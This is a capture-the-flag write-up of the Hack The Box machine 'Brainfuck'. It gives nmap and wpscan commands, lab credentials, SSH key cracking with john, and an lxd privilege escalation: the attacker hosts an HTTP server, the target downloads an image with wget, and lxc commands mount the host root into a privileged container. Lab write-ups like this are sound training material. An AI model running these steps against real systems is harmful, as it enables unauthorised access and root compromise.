# [Brainfuck](https://app.hackthebox.com/machines/brainfuck)

```bash
nmap -p- --min-rate 10000 10.10.10.17 -Pn 
```

![Alt text](img/image.png)


After discovering open ports, let's do greater nmap scan.

```bash
nmap -A -sC -sV -p22,25,110,143,443 10.10.10.17 -Pn 
```

![Alt text](img/image-1.png)

From nmap scan result, I see that I need to add this ip address into '**/etc/hosts**' file.

```bash
www.brainfuck.htb
sup3rs3cr3t.brainfuck.htb
```


While accessing the application, I see that is Wordpress website.

![Alt text](img/image-2.png)

I grab orestis@brainfuck.htb as a username.


Let's use `wpscan` tool to search exploit for this website.
```bash
wpscan --url https://brainfuck.htb --disable-tls-checks
```

![Alt text](img/image-3.png)

It finds this [exploit](https://www.exploit-db.com/exploits/41006).


I need to create **malicious html file**.

![Alt text](img/image-4.png)



Now, we are admin.

![Alt text](img/image-5.png)


I browse to the page called `wp-admin` to look at SNMP configuration as because from my nmap scan I saw that port (SNMP and POP3 are open).

![Alt text](img/image-6.png)


There's password to see this, I just need to look at Source Code (Ctrl+U)

![Alt text](img/image-7.png)

Password: kHGuERB29DNiNE


Let's connect to port (110) by using `nc`
```bash
nc -nv 10.10.10.17 110
USER orestis
PASS kHGuERB29DNiNE
```

![Alt text](img/image-8.png)

I just enumerate POP3 server via `retr 1` and `retr 2` commands to see mails.

![Alt text](img/image-9.png)


I grab credentials from here.

orestis: kIEnnfEKJ#9UmdO


From nmap scan result, I saw application 'sup3rs3cr3t.brainfuck.htb', let's login here via grabbed credentials.


![Alt text](img/image-10.png)


Here's interesting part, `Key Chat`.

![Alt text](img/image-11.png)


I grabbed all messages of them and try to decrypt.

I find a key of 'Vigenere cipher' equals to  “fuckmybrain” or “mybrainfuck” or maybe “brainfuckmy”.


![Alt text](img/image-12.png)

![Alt text](img/image-13.png)


While I browse the page 'https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa', I got private key of 'orestis' user.

Let's crack this via `ssh2john` tool.

```bash
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![Alt text](img/image-14.png)


orestis: 3poulakia!


Let's login into machine via `ssh`.
```bash
ssh -i id_rsa orestis@10.10.10.17
```

user.txt

![Alt text](img/image-15.png)


While enumeration via `id` command, I see that this user belongs to group called '**lxd**' .

![Alt text](img/image-16.png)


I used privilege escalation technique from [here](https://www.hackingarticles.in/lxd-privilege-escalation/).

![Alt text](img/image-17.png)

Now, I need to transfer malicious 'gunzip' file (being 2023) into machine.

```bash
python3 -m http.server --bind 10.10.16.8 8080
```
![Alt text](img/image-18.png)

Download this script.

```bash
wget http://10.10.16.8:8080/alpine-v3.19-x86_64-20231226_1158.tar.gz
```

![Alt text](img/image-19.png)

After this, we need to execute below commands.

```bash
lxc image import ./alpine-v3.19-x86_64-20231226_1158.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

![Alt text](img/image-20.png)



